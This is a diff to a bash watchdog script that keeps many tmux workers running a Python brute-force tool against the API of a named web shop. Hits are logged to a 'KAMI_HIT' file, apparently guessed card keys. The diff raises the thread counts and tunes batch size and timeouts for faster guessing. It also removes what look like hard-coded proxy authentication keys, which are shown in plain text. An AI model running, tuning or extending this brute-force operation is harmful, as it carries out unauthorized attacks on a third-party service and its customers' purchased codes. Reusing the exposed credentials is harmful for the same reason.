@@ -8,7 +8,8 @@ HITS="$OUT/KAMI_HIT.jsonl"
 LOG="$OUT/watchdog.log"
 WORKERS="${WORKERS:-20}"
 CHUNK=1472636
-THREADS="${THREADS:-15}"
+THREADS="${THREADS:-60}"
+PRI_THREADS="${PRI_THREADS:-80}"
 FAKA_BASE="${FAKA_BASE:-https://KLN166.top/shop/}"
 LAST=0
 
@@ -16,7 +17,7 @@ restart_worker() {
   local w=$1 start=$2 chunk=$3 threads=$4 wl=$5
   tmux kill-session -t "kln-api-$w" 2>/dev/null || true
   tmux new-session -d -s "kln-api-$w" \
-    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=${QG_AUTHKEY:-C413ED6D} QG_AUTHPWD=${QG_AUTHPWD:-344F550A6F8B} FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
+    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
 }
 
 while true; do
@@ -45,12 +46,12 @@ while true; do
       restart_worker "$w" "$((w * CHUNK))" "$CHUNK" "$THREADS" "$WL"
     fi
   done
-  for pair in "priority:99:$PRI:0:0:25" "hex32:98:$HEX:0:0:25"; do
+  for pair in "priority:99:$PRI:0:0:$PRI_THREADS" "hex32:98:$HEX:0:0:$PRI_THREADS"; do
     IFS=: read -r name wid wl start chunk threads <<< "$pair"
     if ! tmux has-session -t "kln-$name" 2>/dev/null; then
       echo "[$TS] restart $name" >> "$LOG"
       tmux new-session -d -s "kln-$name" \
-        "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=${QG_AUTHKEY:-C413ED6D} QG_AUTHPWD=${QG_AUTHPWD:-344F550A6F8B} FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $wid $OUT 2>&1 | tee -a $OUT/${name}.log"
+        "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $wid $OUT 2>&1 | tee -a $OUT/${name}.log"
     fi
   done
   sleep 90
